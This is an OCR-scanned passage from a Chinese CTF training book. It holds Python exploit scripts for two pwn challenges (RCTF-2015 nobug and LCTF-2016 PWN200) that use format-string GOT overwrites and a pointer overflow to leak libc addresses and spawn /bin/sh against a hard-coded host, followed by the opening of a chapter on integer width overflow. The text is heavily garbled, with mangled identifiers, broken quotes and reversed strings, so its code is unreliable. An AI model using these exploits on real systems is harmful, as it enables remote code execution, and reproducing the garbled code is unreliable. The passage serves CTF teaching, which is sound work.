strlen_got=0x0804A030
addr= strlen_got
for i in range(4):
do_fmt(io,%%%dc%%31$hhn'%(path+i)&Oxff)
k=（（addr>>（i*8））&0xff)
if k!=0:
do_fmt（io，%%%dc%%67$hhn'%k)
else:
do_fmt(io,%%67Shhn)
addr= strlen_got +2
for iin range(4):
do_fmt(io,%%%dc%%31$hhn'% (path + 4 +i) &0xff))
k=（（addr>>（i*8））&0xff)
if k!=0:
dofmt（io,%%%dc%%67$hhn'%k）
else:
do_fmt(io,%%67$hhn)
d=do_fmt（io，"%29$p")
libc_main=int（d,16）
print hex(libc_main)
libbase=libc_main-0x00019A63
---
## Page 568
CTF特训营：技术详解、解题方法与
14.4.2 (RCTF-2015)nobug(PWN300)
568/1144
system=lib_base+Ox0003FCD0
systemlow=system&oxff
systemhigh=(system>>16)&0xfff
xpu！moes/s）%uu$p%%%p%%%uusp%%%p%%%）yop
systemhigh-systemlow,index3+1))
io.writeline(/bin/sh)
defexp(target):
io=zio（target,timeout=10000,print_read=COLORED（RAW,red)，print_write=
COLORED（RAW,'green))
write_any(io)
io.interact()
exp(target)
---
## Page 569
CTF特训营：技术详解、解题方法与
14.4.3 (LCTF-2016)PWN200
569/1144
14.4.3{LCTF-2016}PWN200
该题的漏洞也比较简单，漏洞点反汇编代码如图14-18所示。
int sub_400A29（）
char buf[56];//[sp+0h] [bp-4oh]@1
char *dest;//[sp+38h] [bp-8hj@1
dest=（char*)malloc（θx4θuLL）;
puts("giue me money~");
read（θ,buf,64uLL);
strcpy(dest,buf);
money = dest;
return sub_4009c4(）;
图14-18PWN200漏洞点反汇编代码
直接读取溢出能够覆盖dest的指针，然后通过strcpy就可以实现
任意地址写了，首先可以将free改写成printf，实现任意地址泄露，然
后通过在前面name栈中布置好地址，可以实现任意地址改写。
利用代码具体如下：
---
## Page 570
CTF特训营：技术详解、解题方法与
14.4.3 (LCTF-2016)PWN200
570/1144
from zio import *
target="/pwn200"
target =(119.28.63.211",2333)
def get_io(target):
r_m=COLORED（RAW,“green")
w_m=COLORED（RAW，"blue")
io =zio(target, timeout = 9999, print_read =r_m, print_write = w_m)
return io
def pwn(io):
io.read until("u?\n")
#io.gdb_hint()
read_got
=0x0000000000602038
free_got
=0x0000000000602018
atoi_got
=0x0000000000602060
strcpy_got
=0x0000000000602020
#name_addr:0x7ffc87784f0
#rbp:0x7fffc8778520
#money buff :Ox7ffc8778540
payload="
payload += I64(read_got)
payload +=164(strcpy_got+0)
payload +=164(strcpy_got+2)
payload+=|64(free_got+0)
io.writeline(payload)
#io.write("1"*48)
#io.read_until(1*48)
#data = io.read_until(",welcome")[:-len(",welcome")]
#rbp=164(data[:8].1just（8,x00))
#print“rbp:",hex（rbp)
io.readuntil("?\n")
io.writeline("123")
io.read_until("~n")
malloc_got=0x0000000000602050
printf_plt
=0x0000000000400640
strcpy_plt
=0x0000000000400620
payload="
payload += 164(printf_plt)
payload = payload.ljust(56,x00)
payload +=164(free_got)
io.write(payload)
io.read_until("choice :")
io.writeline("2")
---
## Page 571
CTF特训营：技术详解、解题方法与
14.4.3 (LCTF-2016)PWN200
571/1144
io.read until("choice:")
io.writeline("1")
io.readuntil("long?\n")
io.writeline(str(0x80))
io.read_until(":")
io.read_until("\n128\n")
payload = 
payload +="%26Ss."
jo.write(payload)
io.readuntil("choice:")
io.writeline("2")
u~nounpeero
data =io.read_until(--.--")[:-6]
read_addr=164(data[:8].just(8,x00°))
print “read_addr:",hex(read_addr)
offset_read
=0xeb530
offset_system=0x44c40
offset_system=0x00000000000468f0
offset_dup2=0x00000000000ece70
offset_read=0x00000000000ec690
offset_write=0x00000000000ec6f0
libc_base=read_addr-offset_read
system_addr=libc base+offset_system
io.read_until("choice:")
io.writeline("1")
io.writeline(str(0x80))
（:）un peero
io.read_until("n128\n")
print"system_addr:",hex(system_addr)
high_part=(system_addr&0xfff0000）>>16
low_part=system_addr&0x000offf
if low_part>high_part:
high_part +=0x10000
print hex(low_part)
print hex(high_part)
payload =
payload+="%%%dc%%29$hhn"%(0x20)
payload+="%%%dc%%27$hn"%（low_part-0x20)
payload +="%%%dc%%28$hn"%(high_part -low_part)
print payload
io.write(payload)
io.readuntil("choice:")
---
## Page 572
CTF特训营：技术详解、解题方法与
14.4.3 (LCTF-2016)PWN200
572/1144
io.gdb_hint()
io.writeline("2")
io.readuntil("choice:"）
io.writeline("1")
io.read_until(*"long?\n")
io.writeline(str(0x80))
（）nunpearo
io.read_until("n128\n")
io.writeline("/bin/sh;")
io.read_until("choice:")
io.writeline("2")
io.interact()
io=get_io（target)
pwn(io)
---
## Page 573
CTF特训营：技术详解、解题方法与
第15章整型漏洞
573/1144
第15章整型漏洞
整型漏洞主要是指发生在整型数据上的漏洞，传统的整型溢出是
指试图保存的数据超过整型数据的宽度时发生的溢出。这里将针对
CTF赛题类型，主要从3个方面进行介绍，包括整型数据宽度溢出
符号转换、index数组越界等。
---
## Page 574
CTF特训营：技术详解、解题方法与
15.1宽度溢出
574/1144
15.1宽度溢出
整型数据在计算机中的存储是有特定格式的，一般是按字节进行
存储的，不同的整型数据所需要的字节数也不同，这里说的“所需要
的字节数”就是该整型数据的宽度，如果数据所要表达的值大于该宽
度，则会产生宽度溢出。
整型数据存储通常包含两种模式一大端和小端。
大端存储模式是指数据的高位在前低位在后，小端存储模式是指
数据的低位在前高位在后，如图15-1所示
大端存储：0x12345678→12345678
小端存储：0x12345678—>78563412
图15-1大端小端存储示意图
一般情况下，整型数据大多采用小端存储模式存储。在C语言中
常用的整型数据宽度如表15-1所示。
表15-1各数据类型的宽度
---
## Page 575
CTF特训营：技术详解、解题方法与
15.1宽度溢出
575/1144
类型
宽度
类型
宽度
unsigned short (int) 
2
int16
int
（一般为4，与系统字长有关）
int32
unsigned int
（一般为4.与系统字长有关）
int64
8
long
4
bool
1
unsigned long
4
char
、
long long
8
unsigned char
1
unsigned long long
8
short (int)
2
（与系统字长有关）
整型数据宽度溢出主要出现的情况包括整型数据运算、整型数据
赋值等，将字节占用多的整型数据存储在字节占用少的整型数据中
产生宽度溢出情况的示意如图15-2所示。
预存整数
↑
实存整数
↑
图15-2宽度溢出示意图
为了更方便地说明宽度溢出的情况，下面用一个简化版的实例来
进行具体说明，代码如下：
---
## Page 576
CTF特训营：技术详解、解题方法与
15.1宽度溢出
576/1144
#include
unsigned short int part_1;
unsigned short int part_2;
unsigned int part_3;
unsigned short int part_4;
void add_test()
part_3=par_1 +part_2;
part _4=part_1+part_2;
printf(part_1(%d):%llxin", sizeof(part_1),part_1);
printf(part_2(%d）:%llXin",sizeof(part_2）,part_2);
printf(part 3(%d）:%lXin”，sizeof（part3），part3）;
printf(part_4(%d):%lXin, sizeof(part_4),part_4);
intmain()
part_1 =0xFFFF;
part_2=0x2;
add_test();
由上述代码可知，整型数据运算过程中的数据存储示意如图15-3
所示，为了方便查看，这里使用大端模式。
part_1
FF
FF
part_2
00
02
part_3
00
01
00
01
part_4
00
01
---
## Page 577
CTF特训营：技术详解、解题方法与
15.1宽度溢出
577/1144
图15-3数据存储示意图
在IDA中，查询part_1~part_4的内存地址，如图15-4所示。
.bss:0000000000601044;unsigned
int16 part_4
.bss:0000000000601044 part_4
dw?
.b55 : 0000000000601044
bss : 0000000000601046
db
？；
.bss:0000000000601047 unk_601047
db
？；
.bs5 : 0000000000601048
public part_3
.bss:0000000000601048 ; unsigned int part_3
.bss:0000000000601048 part_3
PP
.bs5 : 00000000006 01048
.bss : 00000000006 0104C
public part_1
.bss:000000000060104c ; unsigned
int16 part_1
.bss:000000000060104C part_1
dw?
.bs5 : 0000000000601040
.bss : 00000000006 0104E
public part_2
.bS5 : 00000000006 0104E 
；unsigned
int16 part _2
.bss:000000000060104E part_2
du?
bS5: 000000000060104E
.bss : 00000000006 0104E
_bss
ends
.bSS : 000000000060104E
图15-4内存地址
将上述代码编译出的程序放入gdb中进行调试，在相加完以后下
断点，内存情况如图15-5所示。
edaSx/4xw8part_4
x601044:
0x00000001
0x00010001
0x0002ffff
pedas prtnt *（short*）apart_1
0x00000000
511=
oxffff
print *（short*）8part_2
$12=0x2
print *（int*）apart_3
S13=0x10001
daS print *（short*）&part_4
---
## Page 578
CTF特训营：技术详解、解题方法与
15.1宽度溢出
578/1144